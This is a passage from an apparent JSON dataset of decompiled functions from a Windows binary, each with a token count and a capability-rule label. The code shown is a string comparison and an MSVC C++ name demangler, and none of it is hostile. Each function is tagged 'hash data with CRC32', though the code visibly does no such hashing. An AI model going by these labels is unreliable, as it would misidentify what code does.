        "decompiled_code": "\nuint __cdecl fcn.004337ea(uint8_t *arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(arg_8h + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*arg_8h & 0x80) != 0 && ((*arg_ch & 0x10) != 0)))) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(arg_ch + 4)) {\n            puVar3 = *(arg_ch + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x0043383b:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x00433840;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x0043383b;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x00433840:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*arg_ch & 2) == 0) || ((*arg_8h & 8) != 0)) &&\n           ((((*arg_10h & 1) == 0 || ((*arg_8h & 1) != 0)) && (((*arg_10h & 2) == 0 || ((*arg_8h & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 527
    },
    "00434d42": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_8ch\n\nchar ** __cdecl fcn.00434d42(char **arg_8h, char **arg_ch)\n\n{\n    uint uVar1;\n    char **ppcVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    uint *var_8ch;\n    char **var_84h;\n    uint var_7ch;\n    char **var_78h;\n    char *var_74h;\n    uint var_70h;\n    uint32_t var_68h;\n    char *var_64h;\n    int32_t var_60h;\n    char *var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    char **var_48h;\n    uint var_44h;\n    char **var_40h;\n    char *var_3ch;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    char *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    char **var_18h;\n    uint32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    var_34h = *0x6ccc1c - *0x6ccc20;\n    pcVar8 = NULL;\n    var_10h = NULL;\n    var_ch = NULL;\n    var_14h = fcn.0043a10b();\n    var_18h = arg_ch + 1;\n    if ((*arg_ch == NULL) || ((*var_18h & 0x200) == 0)) {\n        var_60h = 0;\n    }\n    else {\n        var_60h = 1;\n    }\n    if (var_14h == 0xffff) {\n        fcn.00434635(2);\n        return arg_8h;\n    }\n    if (var_14h == 0xfffe) {\n        fcn.004349c5(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if (var_14h == 0xfffd) {\n        *arg_8h = *arg_ch;\n        pcVar4 = *var_18h;\n        goto code_r0x00435a32;\n    }\n    uVar6 = var_14h & 0x8000;\n    var_30h = uVar6;\n    if (uVar6 == 0) {\ncode_r0x00435464:\n        fcn.00434b03(arg_ch);\n        var_34h = var_14h & 0x7c00;\n        if (uVar6 == 0) {\n            if ((var_34h == 0x6800) || (var_34h == 0x7000)) {\n                fcn.0043a84b(arg_8h, &fcn.00434d42::var_10h);\n                return arg_8h;\n            }\n            if (var_34h == 0x6000) {\n                var_8h = var_10h;\n                var_3ch = 0x47db40;\n                var_38h = 2;\n                var_4h = var_ch;\n                fcn.00434b5a(0x7b);\n                fcn.00437399(&fcn.00434d42::var_54h, 0);\n                fcn.00434a09(&fcn.00434d42::var_2ch, &fcn.00434d42::var_54h);\n                fcn.004349e7(arg_8h, &fcn.00434d42::var_3ch);\n                return arg_8h;\n            }\n        }\n        if ((var_14h & 0xfc00) == 0x7c00) {\n            fcn.0043a7ea(arg_8h, &fcn.00434d42::var_10h);\n            return arg_8h;\n        }\n        uVar9 = var_14h & 0x6000;\n        uVar5 = var_14h & 0x1800;\n        if (uVar6 == 0) {\n            bVar10 = uVar9 == 0;\n        }\n        else {\n            bVar10 = uVar5 == 0x800;\n        }\n        var_48h = var_14h & 0x1000;\n        var_40h = var_14h & 0x400;\n        ppcVar2 = var_40h;\n        if (!bVar10) {\n            ppcVar2 = var_48h;\n        }\n        var_1ch = uVar9;\n        if ((ppcVar2 == NULL) || ((var_14h & 0x1b00) != 0x1000 || uVar6 == 0)) {\n            if (uVar6 == 0) {\n                bVar10 = uVar9 == 0;\n            }\n            else {\n                bVar10 = uVar5 == 0x800;\n            }\n            ppcVar2 = var_40h;\n            if (!bVar10) {\n                ppcVar2 = var_48h;\n            }\n            if ((ppcVar2 != NULL) && ((var_14h & 0x1b00) == 0x1100 && uVar6 != 0)) {\n                var_8h = \"`template static data member constructor helper\\'\";\n                var_4h = 0x30;\n                goto code_r0x0043562c;\n            }\n            if (uVar6 == 0) {\n                bVar10 = uVar9 == 0;\n            }\n            else {\n                bVar10 = uVar5 == 0x800;\n            }\n            ppcVar2 = var_40h;\n            if (!bVar10) {\n                ppcVar2 = var_48h;\n            }\n            if ((ppcVar2 != NULL) && ((var_14h & 0x1b00) == 0x1200 && uVar6 != 0)) {\n                var_8h = \"`template static data member destructor helper\\'\";\n                var_4h = 0x2f;\n                goto code_r0x0043562c;\n            }\n            if (uVar6 == 0) {\n                pcVar4 = var_ch;\n                if (var_34h == 0x7800) goto code_r0x00435a2d;\n                goto code_r0x004356b0;\n            }\ncode_r0x0043563f:\n            bVar10 = uVar5 == 0x800;\n        }\n        else {\n            var_8h = \"`local static destructor helper\\'\";\n            var_4h = 0x20;\ncode_r0x0043562c:\n            fcn.00434aab(&fcn.00434d42::var_8h);\n            if (uVar6 != 0) goto code_r0x0043563f;\ncode_r0x004356b0:\n            bVar10 = uVar9 == 0;\n        }\n        ppcVar2 = var_40h;\n        if (!bVar10) {\n            ppcVar2 = var_48h;\n        }\n        if ((ppcVar2 == NULL) ||\n           (((var_14h & 0x1b00) != 0x1100 || uVar6 == 0 && ((var_14h & 0x1b00) != 0x1200 || uVar6 == 0)))) {\n            ppcVar2 = fcn.00437970(&fcn.00434d42::var_2ch, &fcn.00434d42::var_10h);\n        }\n        else {\n            ppcVar2 = fcn.0043499a(&fcn.00434d42::var_2ch, 0x20, &fcn.00434d42::var_10h);\n        }\n        var_18h = ppcVar2[1];\n        var_10h = *ppcVar2;\n        pcVar4 = var_18h;\n        var_ch = var_18h;\n        if (var_30h == 0) {\n            bVar10 = var_1ch == 0;\n            var_ch = var_18h;\n        }\n        else {\ncode_r0x004356e0:\n            var_18h = pcVar4;\n            bVar10 = uVar5 == 0x800;\n        }\n        var_4h = var_18h;\n        uVar6 = var_30h;\n        if (bVar10) {\n            if ((~(*0x6ccc24 >> 9) & 1) != 0) {\n                if (var_30h == 0) {\n                    bVar10 = var_1ch == 0;\n                }\n                else {\n                    bVar10 = uVar5 == 0x800;\n                }\n                if (bVar10) {\n                    if ((var_30h == 0) || ((var_14h & 0x700) == 0x200)) {\n                        var_8h = \"static \";\n                        var_4h = 0x7;\n                        fcn.00434593(&fcn.00434d42::var_8h);\n                        fcn.00434a09(&fcn.00434d42::var_8h, &fcn.00434d42::var_10h);\n                        var_10h = var_8h;\n                        var_18h = var_4h;\n                        var_ch = var_4h;\n                        goto code_r0x00435775;\n                    }\ncode_r0x0043577c:\n                    uVar6 = var_14h & 0x700;\n                    if (uVar6 != 0x100) {\n                        bVar10 = uVar5 == 0x800;\n                        goto code_r0x004357ad;\n                    }\n                }\n                else {\ncode_r0x00435775:\n                    if (var_30h != 0) goto code_r0x0043577c;\n                    bVar10 = var_1ch == 0;\n                    uVar6 = var_14h & 0x700;\ncode_r0x004357ad:\n                    if ((var_14h & (-bVar10 & 0xfffff400) + 0x1000) == 0) goto code_r0x00435879;\n                    if (var_30h == 0) {\n                        bVar10 = var_1ch == 0;\n                    }\n                    else {\n                        bVar10 = uVar5 == 0x800;\n                    }\n                    var_20h = bVar10;\n                    if ((var_20h == 0) || (uVar6 != 0x500)) {\n                        if (var_30h == 0) {\n                            bVar10 = var_1ch == 0;\n                        }\n                        else {\n                            bVar10 = uVar5 == 0x800;\n                        }\n                        var_20h = bVar10;\n                        if ((var_20h == 0) || (uVar6 != 0x600)) {\n                            if (var_30h == 0) {\n                                bVar10 = var_1ch == 0;\n                            }\n                            else {\n                                bVar10 = uVar5 == 0x800;\n                            }\n                            if ((!bVar10) || (uVar6 != 0x400)) goto code_r0x00435879;\n                        }\n                    }\n                }\n                var_8h = \"virtual \";\n                var_4h = 0x8;\n                fcn.00434593(&fcn.00434d42::var_8h);\n                fcn.00434a09(&fcn.00434d42::var_8h, &fcn.00434d42::var_10h);\n                var_10h = var_8h;\n                var_18h = var_4h;\n                var_ch = var_4h;\n            }\ncode_r0x00435879:\n            uVar6 = var_30h;\n            var_4h = var_18h;\n            if ((~(*0x6ccc24 >> 7) & 1) != 0) {\n                if (var_30h == 0) {\n                    bVar10 = var_1ch == 0;\n                }\n                else {\n                    bVar10 = uVar5 == 0x800;\n                }\n                if (bVar10) {\n                    if (var_30h == 0) {\n                        bVar10 = uVar5 == 0x800;\n                    }\n                    else {\n                        var_34h = 0;\n                        bVar10 = (var_14h & 0xc0) == 0x40;\n                    }\n                    if (!bVar10) goto code_r0x004358da;\n                    var_8h = \"private: \";\n                    var_4h = 0x9;\ncode_r0x00435921:\n                    fcn.00434593(&fcn.00434d42::var_8h);\n                    fcn.00434a09(&fcn.00434d42::var_8h, &fcn.00434d42::var_10h);\n                    var_10h = var_8h;\n                    var_ch = var_4h;\n                }\n                else {\ncode_r0x004358da:\n                    if (var_30h == 0) {\n                        bVar10 = var_1ch == 0;\n                    }\n                    else {\n                        bVar10 = uVar5 == 0x800;\n                    }\n                    if (bVar10) {\n                        if (var_30h == 0) {\n                            bVar10 = uVar5 == 0x1000;\n                        }\n                        else {\n                            var_34h = 0;\n                            bVar10 = (var_14h & 0xc0) == 0x80;\n                        }\n                        if (bVar10) {\n                            var_8h = \"protected: \";\n                            var_4h = 0xb;\n                            goto code_r0x00435921;\n                        }\n                    }\n                    if (var_30h == 0) {\n                        bVar10 = var_1ch == 0;\n                    }\n                    else {\n                        bVar10 = uVar5 == 0x800;\n                    }\n                    if (bVar10) {\n                        uVar9 = uVar5;\n                        if (var_30h != 0) {\n                            uVar9 = var_14h & 0xc0;\n                        }\n                        if (uVar9 == 0) {\n                            var_8h = \"public: \";\n                            var_4h = 0x8;\n                            goto code_r0x00435921;\n                        }\n                    }\n                }\n            }\n        }\n        uVar9 = var_14h;\n        if (uVar6 == 0) {\n            bVar10 = var_1ch == 0;\n        }\n        else {\n            bVar10 = uVar5 == 0x800;\n        }\n        if (((var_14h & (-bVar10 & 0xfffff400) + 0x1000) != 0) && ((*0x6ccc24 & 0x1000) == 0)) {\n            var_8h = \"[thunk]:\";\n            var_4h = 0x8;\n            fcn.00434593(&fcn.00434d42::var_8h);\n            fcn.00434a09(&fcn.00434d42::var_8h, &fcn.00434d42::var_10h);\n            var_10h = var_8h;\n            var_ch = var_4h;\n        }\n        pcVar4 = var_4h;\n        if ((uVar9 & 0x10000) != 0) {\n            var_8h = \"extern \\\"C\\\" \";\n            var_4h = 0xb;\n            fcn.00434593(&fcn.00434d42::var_8h);\n            fcn.00434a09(&fcn.00434d42::var_8h, &fcn.00434d42::var_10h);\n            pcVar4 = var_4h;\n            var_10h = var_8h;\n        }\n    }\n    else {\n        var_1ch = var_14h & 0x6000;\n        uVar5 = var_14h & 0x1800;\n        var_78h = var_14h & 0x400;\n        var_48h = var_14h & 0x1000;\n        ppcVar2 = var_48h;\n        if (uVar5 == 0x800) {\n            ppcVar2 = var_78h;\n        }\n        if ((ppcVar2 != NULL) && ((var_14h & 0x1b00) == 0x1000)) goto code_r0x00435464;\n        var_40h = var_48h;\n        if (uVar5 == 0x800) {\n            var_40h = var_78h;\n        }\n        if ((var_40h != NULL) && (((var_14h & 0x1b00) == 0x1100 || ((var_14h & 0x1b00) == 0x1200))))\n        goto code_r0x00435464;\n        if ((var_14h & 0x4000) != 0) {\n            if ((~((*0x6ccc24 >> 2 | *0x6ccc24) >> 1) & 1) == 0) {\n                uVar1 = fcn.004360bf(&fcn.00434d42::var_8h);\n                fcn.00434c93(uVar1);\n            }\n            else {\n                uVar1 = fcn.004360bf(&fcn.00434d42::var_8h);\n                ppcVar2 = fcn.0043499a(&fcn.00434d42::var_3ch, 0x20, uVar1);\n                var_10h = *ppcVar2;\n                var_ch = ppcVar2[1];\n            }\n        }\n        ppcVar2 = var_78h;\n        if (uVar5 != 0x800) {\n            ppcVar2 = var_48h;\n        }\n        if ((ppcVar2 != NULL) && (uVar5 == 0x1800)) {\n            var_84h = &fcn.00434d42::var_3ch;\n            fcn.00434a2b(var_84h, 0x7b);\n            var_8ch = &fcn.00434d42::var_8h;\n            fcn.00437399(var_8ch, 0);\n            var_8ch = &fcn.00434d42::var_54h;\n            uVar1 = fcn.00434a09(var_8ch, &fcn.00434d42::var_8h);\n            fcn.00434b03(uVar1);\n            fcn.0043a609(&fcn.00434d42::var_3ch);\n            if ((*0x6ccc24 & 0x1000) == 0) {\n                var_8h = 0x47db3c;\n                var_4h = 0x3;\n                fcn.0043499a(&fcn.00434d42::var_54h, 0x2c, &fcn.00434d42::var_3ch);\n                uVar1 = fcn.004349e7(&fcn.00434d42::var_5ch, &fcn.00434d42::var_8h);\n                fcn.00434b03(uVar1);\n            }\n            var_8h = 0x47db40;\n            var_4h = 0x2;\n            fcn.00434aab(&fcn.00434d42::var_8h);\n            fcn.004367ce(&fcn.00434d42::var_8h);\n            pcVar4 = var_ch;\n            if ((((~(*0x6ccc24 >> 1) & 1) != 0) && (pcVar4 = var_ch,  (~(*0x6ccc24 >> 4) & 1) != 0)) &&\n               (pcVar4 = var_ch,  (*0x6ccc24 & 0x1000) == 0)) {\n                fcn.0043499a(&fcn.00434d42::var_3ch, 0x20, &fcn.00434d42::var_8h);\n                fcn.00434a2b(&fcn.00434d42::var_54h, 0x20);\n                ppcVar2 = fcn.00434a09(&fcn.00434d42::var_5ch, &fcn.00434d42::var_10h);\n                var_10h = *ppcVar2;\n                var_ch = ppcVar2[1];\n                pcVar4 = var_ch;\n            }\n            goto code_r0x004356e0;\n        }\n        var_3ch = NULL;\n        var_38h = 0;\n        var_8h = NULL;\n        var_4h = NULL;\n        var_5ch = NULL;\n        var_58h = 0;\n        var_74h = NULL;\n        var_20h = 0;\n        var_54h = 0;\n        var_50h = 0;\n        ppcVar2 = var_78h;\n        if (uVar5 != 0x800) {\n            ppcVar2 = var_48h;\n        }\n        uVar6 = var_14h & 0x700;\n        var_68h = uVar6;\n        if (ppcVar2 != NULL) {\n            if (uVar5 == 0x800) {\n                if (uVar6 == 0x600) {\n                    var_84h = &fcn.00434d42::var_24h;\n                    fcn.00437399(var_84h, 1);\n                    var_3ch = var_24h;\n                    var_38h = var_20h;\n                    var_8ch = &fcn.00434d42::var_24h;\n                    fcn.00437399(var_8ch, 1);\n                    var_8h = var_24h;\n                    var_4h = var_20h;\n                    fcn.00437399(&fcn.00434d42::var_24h, 1);\n                }\n                else {\n                    if (uVar6 != 0x500) goto code_r0x0043509c;\n                    var_84h = &fcn.00434d42::var_24h;\n                    fcn.00437399(var_84h, 1);\n                }\n                var_5ch = var_24h;\n            }\ncode_r0x0043509c:\n            var_84h = &fcn.00434d42::var_24h;\n            var_58h = var_20h;\n            fcn.00437399(var_84h, 1);\n            var_74h = var_24h;\n        }\n        if ((uVar5 == 0x800) && (uVar6 != 0x200)) {\n            if ((*0x6ccc24 & 0x60) == 0x60) {\n                var_84h = 0x4350ee;\n                uVar1 = fcn.0043a0b9(&fcn.00434d42::var_44h);\n                var_84h = 0x4350f8;\n                fcn.00434c93(uVar1);\n            }\n            else {\n                var_84h = 0x4350db;\n                puVar3 = fcn.0043a0b9(&fcn.00434d42::var_44h);\n                var_54h = *puVar3;\n                var_50h = puVar3[1];\n            }\n        }\n        if (((~(*0x6ccc24 >> 1) & 1) == 0) || ((~(*0x6ccc24 >> 4) & 1) == 0)) {\n            var_84h = 0x435141;\n            puVar3 = fcn.004367ce(&fcn.00434d42::var_70h);\n            var_84h = 0x43514b;\n            fcn.00434c93(puVar3);\n        }\n        else {\n            var_84h = 0x43511b;\n            fcn.004367ce(&fcn.00434d42::var_44h);\n            puVar3 = &fcn.00434d42::var_10h;\n            var_84h = &fcn.00434d42::var_70h;\n            ppcVar2 = fcn.00434a09(var_84h, puVar3);\n            var_10h = *ppcVar2;\n            var_ch = ppcVar2[1];\n        }\n        if (*arg_ch != NULL) {\n            if ((var_10h == NULL) || ((*0x6ccc24 & 0x1000) != 0)) {\n                var_ch = *var_18h;\n                var_10h = *arg_ch;\n            }\n            else {\n                var_84h = arg_ch;\n                var_8ch = &fcn.00434d42::var_70h;\n                var_84h = fcn.0043499a(var_8ch, 0x20, arg_ch);\n                fcn.00434b03(var_84h);\n            }\n        }\n        pcVar7 = NULL;\n        var_40h = NULL;\n        var_18h = NULL;\n        if (var_60h == 0) {\n            var_84h = 0x8;\n            var_40h = fcn.00437f77(8);\n            if (var_40h == NULL) {\n                var_40h = NULL;\n            }\n            else {\n                *var_40h = NULL;\n                var_40h[1] = NULL;\n            }\n            var_8ch = &fcn.00434d42::var_70h;\n            ppcVar2 = fcn.004390cc(var_8ch, var_40h);\n            pcVar7 = ppcVar2[1];\n            pcVar8 = *ppcVar2;\n            var_18h = pcVar7;\ncode_r0x00435203:\n            ppcVar2 = var_78h;\n            if (uVar5 != 0x800) {\n                ppcVar2 = var_48h;\n            }\n            if (ppcVar2 != NULL) {\n                if (uVar5 == 0x800) {\n                    if (var_68h == 0x600) {\n                        var_64h = \"`vtordispex{\";\n                        var_60h = 0xc;\n                        var_8ch = 0x435246;\n                        fcn.00434593(&fcn.00434d42::var_64h);\n                        var_8ch = &fcn.00434d42::var_3ch;\n                        fcn.00434a09(&fcn.00434d42::var_64h, var_8ch);\n                        fcn.00434a2b(&fcn.00434d42::var_7ch, 0x2c);\n                        fcn.00434a09(&fcn.00434d42::var_4ch, &fcn.00434d42::var_8h);\n                        fcn.00434a2b(&fcn.00434d42::var_8ch, 0x2c);\n                        fcn.00434a09(&fcn.00434d42::var_84h, &fcn.00434d42::var_5ch);\n                    }\n                    else {\n                        if (var_68h != 0x500) goto code_r0x004352ea;\n                        var_8h = \"`vtordisp{\";\n                        var_4h = 0xa;\n                        var_8ch = 0x4352bf;\n                        fcn.00434593(&fcn.00434d42::var_8h);\n                        var_8ch = &fcn.00434d42::var_5ch;\n                        fcn.00434a09(&fcn.00434d42::var_8h, var_8ch);\n                    }\n                    uVar1 = fcn.00434a2b(var_84h, puVar3);\n                    var_8ch = 0x4352e8;\n                    fcn.00434b03(uVar1);\n                }\n                else {\ncode_r0x004352ea:\n                    var_8h = \"`adjustor{\";\n                    var_4h = 0xa;\n                    var_8ch = 0x435304;\n                    fcn.00434aab(&fcn.00434d42::var_8h);\n                }\n                var_8h = var_74h;\n                var_4h = var_20h;\n                var_8ch = &fcn.00434d42::var_3ch;\n                var_3ch = 0x47db3c;\n                var_38h = 3;\n                fcn.00434aab(var_8ch);\n                fcn.00434b03(&fcn.00434d42::var_8h);\n            }\n            if ((*0x6ccc34 == 1) && (*0x6ccc30 == 0)) {\n                *0x6ccc30 = var_34h;\n            }\n            uVar1 = fcn.00435d1b(&fcn.00434d42::var_2ch);\n            fcn.0043499a(&fcn.00434d42::var_84h, 0x28, uVar1);\n            uVar1 = fcn.00434a2b(&fcn.00434d42::var_8ch, 0x29);\n            fcn.00434b03(uVar1);\n            if ((uVar5 == 0x800) && (var_68h != 0x200)) {\n                fcn.00434b03(&fcn.00434d42::var_54h);\n            }\n            if ((~(*0x6ccc24 >> 0x13) & 1) == 0) {\n                uVar1 = fcn.00438fa7(&fcn.00434d42::var_2ch);\n                fcn.00434c93(uVar1);\n            }\n            else {\n                uVar1 = fcn.00438fa7(&fcn.00434d42::var_2ch);\n                fcn.00434b03(uVar1);\n            }\n            uVar1 = fcn.00438001(&fcn.00434d42::var_2ch);\n            fcn.00434b03(uVar1);\n            if ((~(*0x6ccc24 >> 8) & 1) == 0) {\n                uVar1 = fcn.0043a0e8(&fcn.00434d42::var_2ch);\n                fcn.00434c93(uVar1);\n            }\n            else {\n                uVar1 = fcn.0043a0e8(&fcn.00434d42::var_2ch);\n                fcn.00434b03(uVar1);\n            }\n            uVar1 = fcn.004374a7(&fcn.00434d42::var_2ch);\n            fcn.00434c93(uVar1);\n            pcVar4 = var_ch;\n            if (((~(*0x6ccc24 >> 2) & 1) != 0) && (pcVar4 = var_ch,  var_40h != NULL)) {\n                *var_40h = var_10h;\n                var_40h[1] = var_ch;\n                pcVar4 = var_18h;\n                var_10h = pcVar8;\n                var_ch = pcVar7;\n            }\n            goto code_r0x004356e0;\n        }\n        var_84h = NULL;\n        var_8ch = 0x4351a1;\n        var_8ch = fcn.004390cc(&fcn.00434d42::var_70h, 0);\n        var_84h = fcn.0043499a(&fcn.00434d42::var_64h, 0x20, var_8ch);\n        fcn.00434b03(var_84h);\n        pcVar4 = var_ch;\n        if ((*0x6ccc24 & 0x1000) == 0) goto code_r0x00435203;\n    }\ncode_r0x00435a2d:\n    *arg_8h = var_10h;\ncode_r0x00435a32:\n    arg_8h[1] = pcVar4;\n    return arg_8h;\n}\n",
        "token_count": 7382
    },
    "00435d1b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00435d1b(uint *arg_8h)\n\n{\n    char cVar1;\n    char *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x6ccc1c == 'X') {\n        var_10h = \"void\";\n        var_ch = 4;\n    }\n    else {\n        if (**0x6ccc1c != 'Z') {\n            fcn.00435bb1(&var_8h);\n            if ((var_4h == '\\0') && (cVar1 = **0x6ccc1c,  cVar1 != '\\0')) {\n                if (cVar1 != '@') {\n                    if (cVar1 != 'Z') {\n                        fcn.00434635(2);\n                        return arg_8h;\n                    }\n                    *0x6ccc1c = *0x6ccc1c + 1;\n                    if ((~(*0x6ccc24 >> 0x12) & 1) == 0) {\n                        var_10h = \",<ellipsis>\";\n                        var_ch = 0xb;\n                    }\n                    else {\n                        var_10h = \",...\";\n                        var_ch = 4;\n                    }\n                    fcn.004349e7(arg_8h, &var_10h);\n                    return arg_8h;\n                }\n                *0x6ccc1c = *0x6ccc1c + 1;\n            }\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        if ((~(*0x6ccc24 >> 0x12) & 1) == 0) {\n            var_10h = \"<ellipsis>\";\n            var_ch = 10;\n        }\n        else {\n            var_10h = 0x47daac;\n            var_ch = 3;\n        }\n    }\n    *0x6ccc1c = *0x6ccc1c + 1;\n    fcn.00434593(&var_10h);\n    return arg_8h;\n}\n",
        "token_count": 473
    },
    "00436175": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** __cdecl fcn.00436175(char **arg_8h, int32_t *arg_ch)\n\n{\n    char **ppcVar1;\n    uint uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint var_24h;\n    char *var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    uint var_1h;\n    \n    if (**0x6ccc1c == 0) {\n        fcn.004349c5(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    puVar3 = *0x6ccc1c + 1;\n    uVar4 = **0x6ccc1c;\n    var_1h._0_1_ = 0;\n    var_ch = NULL;\n    var_8h = NULL;\n    if (uVar4 < 0x59) {\n    // switch table (17 cases) at 0x436679\n        switch(uVar4) {\n        case 0x43:\n        case 0x44:\n        case 0x45:\n            var_1ch = \"char\";\n            goto code_r0x004361d9;\n        case 0x46:\n        case 0x47:\n            var_1ch = \"short\";\n            var_18h = 0x5;\n            break;\n        case 0x48:\n        case 0x49:\n            var_1ch = 0x47dcfc;\n            var_18h = 0x3;\n            break;\n        case 0x4a:\n        case 0x4b:\n            var_1ch = \"long\";\ncode_r0x004361d9:\n            var_18h = 0x4;\n            break;\n        case 0x4c:\n            goto code_r0x0043628c;\n        case 0x4d:\n            var_1ch = \"float\";\n            var_18h = 0x5;\n            goto code_r0x00436228;\n        case 0x4f:\n            var_1ch = \"long \";\n            var_18h = 0x5;\n            *0x6ccc1c = puVar3;\n            fcn.0043486d(&var_1ch);\n            puVar3 = *0x6ccc1c;\n        case 0x4e:\n            *0x6ccc1c = puVar3;\n            var_1ch = \"double\";\n            var_18h = 0x6;\n            fcn.00434aab(&var_1ch);\n            goto code_r0x004362b1;\n        case 0x50:\n        case 0x51:\n        case 0x52:\n        case 0x53:\n            uVar4 = uVar4 & 3;\n            *0x6ccc1c = puVar3;\ncode_r0x00436416:\n            var_ch = NULL;\n            var_8h = NULL;\n            var_1ch = *arg_ch;\n            var_18h = arg_ch[1];\n            if (uVar4 != 0xfffffffe) {\n                if (var_1ch == NULL) {\n                    if ((uVar4 & 1) == 0) {\n                        if ((uVar4 & 2) != 0) {\n                            var_14h = \"volatile\";\n                            var_10h = 0x8;\n                            fcn.0043486d(&var_14h);\n                        }\n                    }\n                    else {\n                        var_14h = \"const\";\n                        var_10h = 0x5;\n                        fcn.0043486d(&var_14h);\n                        if ((uVar4 & 2) != 0) {\n                            var_14h = \" volatile\";\n                            var_10h = 0x9;\n                            fcn.00434aab(&var_14h);\n                        }\n                    }\n                }\n                fcn.00438e7a(arg_8h, &var_ch, &var_1ch, 1);\n                return arg_8h;\n            }\n            var_18h = var_18h | 0x800;\n            fcn.00438e7a(&var_14h, &var_ch, &var_1ch, 0);\n            if ((var_10h & 0x800) == 0) {\n                var_1ch = 0x47d4d8;\n                var_18h = 0x2;\n                fcn.00434aab(&var_1ch);\n            }\n            goto code_r0x004365bc;\n        default:\n            var_1ch = \"void\";\n            var_18h = 0x4;\ncode_r0x00436228:\n            *0x6ccc1c = puVar3;\n            fcn.0043486d(&var_1ch);\n            goto code_r0x00436631;\n        }\n        *0x6ccc1c = puVar3;\n        fcn.0043486d(&var_1ch);\ncode_r0x004362b1:\n        if (uVar4 != 0x43) {\n            if ((((uVar4 != 0x45) && (uVar4 != 0x47)) && (uVar4 != 0x49)) && (uVar4 != 0x4b)) {\n                if (uVar4 != 0x5f) goto code_r0x00436631;\n                goto code_r0x004365e3;\n            }\n            goto code_r0x004365ff;\n        }\n        var_1ch = \"signed \";\n        var_18h = 0x7;\n        goto code_r0x0043660d;\n    }\n    if (uVar4 != 0x5f) {\ncode_r0x0043628c:\n        ppcVar1 = fcn.0043750e(&var_1ch);\n        var_14h = *ppcVar1;\n        var_10h = ppcVar1[1];\n        var_ch = var_14h;\n        var_8h = var_10h;\n        if (var_14h == NULL) {\ncode_r0x004365bc:\n            *arg_8h = var_14h;\n            arg_8h[1] = var_10h;\n            return arg_8h;\n        }\n        goto code_r0x004362b1;\n    }\n    var_1h._0_1_ = *puVar3;\n    *0x6ccc1c = *0x6ccc1c + 2;\n    if (var_1h < 0x4f) {\n        if (var_1h != 0x4e) {\n            if (var_1h < 0x49) {\n                if (var_1h == 0x48) {\ncode_r0x004363df:\n                    var_1ch = \"__int32\";\n                }\n                else {\n                    if (var_1h == 0) {\n                        *0x6ccc1c = puVar3;\n                        fcn.00434903(1);\n                        goto code_r0x004365e3;\n                    }\n                    if (var_1h == 0x24) {\n                        var_1ch = \"__w64 \";\n                        var_18h = 0x6;\n                        uVar2 = fcn.00436175(&var_14h, arg_ch);\n                        fcn.00434978(arg_8h, &var_1ch, uVar2);\n                        return arg_8h;\n                    }\n                    if ((var_1h == 0x44) || (var_1h == 0x45)) {\n                        var_1ch = \"__int8\";\n                        var_18h = 0x6;\n                        goto code_r0x004365d7;\n                    }\n                    if ((var_1h != 0x46) && (var_1h != 0x47)) goto code_r0x004365c9;\n                    var_1ch = \"__int16\";\n                }\n            }\n            else {\n                if (var_1h == 0x49) goto code_r0x004363df;\n                if ((var_1h != 0x4a) && (var_1h != 0x4b)) {\n                    if ((var_1h != 0x4c) && (var_1h != 0x4d)) goto code_r0x004365c9;\n                    var_1ch = \"__int128\";\n                    goto code_r0x004363c7;\n                }\n                var_1ch = \"__int64\";\n            }\n            goto code_r0x004365d0;\n        }\n        var_1ch = \"bool\";\ncode_r0x004363f2:\n        var_18h = 0x4;\n        goto code_r0x004365d7;\n    }\n    // switch table (11 cases) at 0x4366b1\n    switch(var_1h) {\n    case 0x4f:\n        uVar4 = 0xfffffffe;\n        goto code_r0x00436416;\n    case 0x50:\n        var_1ch = \"auto\";\n        goto code_r0x004363f2;\n    case 0x51:\n        var_1ch = \"char8_t\";\n        goto code_r0x004365d0;\n    case 0x52:\n        var_1ch = \"<unknown>\";\n        var_18h = 0x9;\n        break;\n    case 0x53:\n        var_1ch = \"char16_t\";\n        goto code_r0x004363c7;\n    case 0x54:\n        var_1ch = \"decltype(auto)\";\n        